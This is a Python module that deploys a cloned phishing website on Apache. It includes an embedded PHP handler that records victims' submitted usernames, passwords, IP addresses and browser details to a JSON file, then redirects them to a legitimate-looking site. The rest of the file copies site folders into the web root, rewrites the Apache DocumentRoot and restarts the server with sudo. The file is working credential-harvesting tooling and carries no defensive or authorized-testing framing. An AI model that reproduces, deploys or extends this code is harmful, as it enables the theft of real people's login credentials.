"""
Phishing Site Setup Module
Configures Apache to serve a phishing website
"""

import os
import shutil
import subprocess
import json
import uuid
import zipfile


APACHE_CONF_PATH = "/etc/apache2/sites-available/000-default.conf"
USER_PHP_SOURCE = "./assets/user.php"
UPLOAD_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "uploads"))

def get_folder_name(path):
    """Extract the folder name from a path"""
    return os.path.basename(os.path.normpath(path))


def find_unique_filename(target_path):
    """Generate unique filename if path already exists"""
    if not os.path.exists(target_path):
        return target_path
    
    base_name, extension = os.path.splitext(target_path)
    counter = 2
    
    # Try with numeric suffix
    while os.path.exists(f"{base_name}{counter}{extension}"):
        counter += 1
    
    return f"{base_name}{counter}{extension}"

def get_php_version():
    """Detect the installed PHP version"""
    try:
        output = subprocess.check_output("php -v", shell=True).decode()
        version_line = output.splitlines()[0]
        version = version_line.split()[1]  # e.g., '8.3.6'
        major_minor = ".".join(version.split(".")[:2])  # '8.3'
        return major_minor
    except Exception as e:
        return None

def create_default_user_php():
    """Create a default user.php file if it doesn't exist"""
    os.makedirs(os.path.dirname(USER_PHP_SOURCE), exist_ok=True)
    
    if not os.path.exists(USER_PHP_SOURCE):
        default_content = """<?php
// Save captured credentials
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

if ($username || $password) {
    $credentials = [
        'id' => uniqid(),
        'timestamp' => date('Y-m-d H:i:s'),
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];
    
    $creds_file = 'creds.json';
    $creds = [];
    
    if (file_exists($creds_file)) {
        $creds = json_decode(file_get_contents($creds_file), true) ?: [];
    }
    
    $creds[] = $credentials;
    file_put_contents($creds_file, json_encode($creds, JSON_PRETTY_PRINT));
}

// Redirect to the original site
header('Location: ' . (isset($_POST['redirect']) ? $_POST['redirect'] : 'https://google.com'));
exit;
?>
"""
        with open(USER_PHP_SOURCE, "w") as f:
            f.write(default_content)

def copy_to_var_www(local_path, target_folder_name):
    """Copy the phishing site to the webserver root"""
    target_path = f"/var/www/html/{target_folder_name}"
    try:
        if os.path.exists(target_path):
            shutil.rmtree(target_path)
        
        contents = os.listdir(local_path)
        if len(contents) == 1 and os.path.isdir(os.path.join(local_path, contents[0])):
            # Use contents of that inner folder as root
            inner_path = os.path.join(local_path, contents[0])
            shutil.copytree(inner_path, target_path)
        else:
            shutil.copytree(local_path, target_path)
        
        # Ensure user.php exists
        create_default_user_php()
        
        # Copy user.php
        user_php_target = os.path.join(target_path, "user.php")
        shutil.copy(USER_PHP_SOURCE, user_php_target)
        
        # Set permissions
        subprocess.call(["sudo", "chmod", "644", user_php_target])
        subprocess.call(["sudo", "chown", "-R", "www-data:www-data", target_path])
        
        return {
            "status": "success",
            "message": f"Folder copied to {target_path}",
            "path": target_path
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to copy site: {str(e)}"
        }

def update_apache_config(new_docroot):
    """Update the Apache configuration to point to the phishing site"""
    php_version = get_php_version()
    
    if not php_version:
        return {
            "status": "warning",
            "message": "Could not detect PHP version. Skipping PHP config."
        }
    
    try:
        # Read the existing config
        with open(APACHE_CONF_PATH, 'r') as file:
            lines = file.readlines()
        
        # Update the DocumentRoot
        with open(APACHE_CONF_PATH, 'w') as file:
            for line in lines:
                if line.strip().startswith("DocumentRoot"):
                    file.write(f"    DocumentRoot {new_docroot}\n")
                else:
                    file.write(line)
        
        # Append PHP config if not already present
        php_config = f"""
<IfModule php{php_version}_module>
    AddType application/x-httpd-php .php
    AddHandler application/x-httpd-php .php
    DirectoryIndex index.php index.html
</IfModule>
"""
        
        with open(APACHE_CONF_PATH, 'r') as file:
            content = file.read()
        
        if f"<IfModule php{php_version}_module>" not in content:
            with open(APACHE_CONF_PATH, 'a') as file:
                file.write(php_config)
        
        return {
            "status": "success",
            "message": f"Apache config updated for PHP {php_version} with new DocumentRoot: {new_docroot}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to update Apache config: {str(e)}"
        }

def restart_apache():
    """Restart the Apache web server"""
    try:
        subprocess.call(["sudo", "systemctl", "restart", "apache2"])
        return {
            "status": "success",
            "message": "Apache restarted successfully"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to restart Apache: {str(e)}"
        }

def process_uploaded_file(file_path, domain_name):
    """Process an uploaded file (zip or directory) and copy to target location"""
    # Create uploads directory if it doesn't exist
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    
    # Create a unique temp directory
    temp_dir = os.path.join(UPLOAD_DIR, f"temp_{uuid.uuid4().hex}")
    os.makedirs(temp_dir, exist_ok=True)
    
    try:
        if zipfile.is_zipfile(file_path):
            # Extract zip file
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            # Check if zip contains a single root folder
            contents = os.listdir(temp_dir)
            if len(contents) == 1 and os.path.isdir(os.path.join(temp_dir, contents[0])):
                # Use the root folder from the zip
                extracted_dir = os.path.join(temp_dir, contents[0])
            else:
                # Use the temp directory directly
                extracted_dir = temp_dir
        else:
            # Just copy the file to the temp directory
            filename = os.path.basename(file_path)
            target_file = os.path.join(temp_dir, filename)
            shutil.copy2(file_path, target_file)
            extracted_dir = temp_dir
        
        # Return the path to the extracted/copied content
        return {
            "status": "success",
            "message": "File processed successfully",
            "path": extracted_dir
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to process uploaded file: {str(e)}"
        }

# API function for uploaded file
def setup_phishing_site_uploaded_api(file_path, domain_name):
    """
    Upload and deploy phishing site.
    If ZIP: copy ZIP to ./uploads and unzip into /var/www/html/{domain}.
    If single file: copy it into /var/www/html/{domain}, then zip that folder into ./uploads.
    """
    results = {
        "domain": domain_name,
        "file_path": file_path,
        "steps": [],
        "status": "success"
    }
    try:
        import os, shutil, zipfile, subprocess
        from phishing_site_setup import create_default_user_php, USER_PHP_SOURCE, update_apache_config, restart_apache

        # prepare paths
        domain_slug = domain_name.replace(".", "_")
        target_path = f"/var/www/html/{domain_slug}"
        os.makedirs("./uploads", exist_ok=True)

        # clear and recreate target folder
        if os.path.exists(target_path):
            shutil.rmtree(target_path)
        os.makedirs(target_path)

        if zipfile.is_zipfile(file_path):
            # case 1: uploaded a ZIP
            saved_zip = os.path.join("uploads", os.path.basename(file_path))
            shutil.copy2(file_path, saved_zip)
            subprocess.call(["sudo", "unzip", "-o", saved_zip, "-d", target_path])
            results["steps"].append({"name": "unzip_zip", "status": "done"})
            results["saved_file"] = saved_zip
        else:
            # case 2: uploaded a single file
            fname = os.path.basename(file_path)
            dest = os.path.join(target_path, fname)
            shutil.copy2(file_path, dest)
            results["steps"].append({"name": "copy_file", "status": "done", "file": fname})

            # now zip the deployed folder
            zip_path = shutil.make_archive(os.path.join("uploads", domain_slug), 'zip', target_path)
            results["steps"].append({"name": "zip_folder", "status": "done"})
            results["saved_file"] = zip_path

        # add the user.php handler
        create_default_user_php()
        user_php_target = os.path.join(target_path, "user.php")
        shutil.copy2(USER_PHP_SOURCE, user_php_target)
        subprocess.call(["sudo", "chmod", "644", user_php_target])
        subprocess.call(["sudo", "chown", "-R", "www-data:www-data", target_path])

        # update Apache and restart
        cfg = update_apache_config(target_path)
        results["steps"].append({"name": "update_apache_config", "result": cfg})
        rst = restart_apache()
        results["steps"].append({"name": "restart_apache", "result": rst})

        results["final_path"] = target_path
        return results

    except Exception as e:
        return {
            "domain": domain_name,
            "file_path": file_path,
            "status": "error",
            "message": str(e)
        }



# Original API function (for backward compatibility)
def setup_phishing_site_api(folder_path, domain_name=None):
    """API function for phishing site setup (original method)"""
    # If domain name is provided, use it for folder name
    if domain_name:
        folder_name = domain_name.replace(".", "_")
    else:
        folder_name = get_folder_name(folder_path)
    
    results = {
        "folder_path": folder_path,
        "steps": [],
        "status": "success"
    }
    
    # Validate the folder path
    if not os.path.isdir(folder_path):
        results["status"] = "error"
        results["message"] = "Invalid path. Make sure the folder exists."
        return results
    
    # Step 1: Copy the site to /var/www/html
    copy_result = copy_to_var_www(folder_path, folder_name)
    results["steps"].append({"name": "copy_to_var_www", "result": copy_result})
    
    if copy_result["status"] == "error":
        results["status"] = "error"
        results["message"] = copy_result["message"]
        return results
    
    # Step 2: Update Apache config
    final_path = copy_result["path"]
    results["final_path"] = final_path
    
    config_result = update_apache_config(final_path)
    results["steps"].append({"name": "update_apache_config", "result": config_result})
    
    # Step 3: Restart Apache
    restart_result = restart_apache()
    results["steps"].append({"name": "restart_apache", "result": restart_result})
    
    if restart_result["status"] == "error":
        results["status"] = "error"
        results["message"] = restart_result["message"]
    
    return results

# Original CLI function - kept for backward compatibility
def phishing_site_setup(folder_path):
    """Original CLI function for phishing site setup"""
    if not os.path.isdir(folder_path):
        print("[-] Invalid path. Make sure the folder exists.")
        return False
    
    folder_name = get_folder_name(folder_path)
    copy_result = copy_to_var_www(folder_path, folder_name)
    
    if isinstance(copy_result, dict) and copy_result.get("status") == "error":
        print(f"[-] {copy_result.get('message')}")
        return False
    
    final_path = copy_result.get("path") if isinstance(copy_result, dict) else copy_result
    update_apache_config(final_path)
    restart_apache()
    return True

if __name__ == "__main__":
    folder_path = input("Enter the path of the cloned phishing site folder: ").strip()
    domain_name = input("Enter the domain name for this phishing site: ").strip()
    
    if domain_name:
        # Use the domain name for the folder
        result = setup_phishing_site_api(folder_path, domain_name)
    else:
        result = setup_phishing_site_api(folder_path)
    
    if result["status"] == "success":
        print("[+] Phishing site setup completed successfully.")
    else:
        print(f"[-] Setup failed: {result.get('message')}")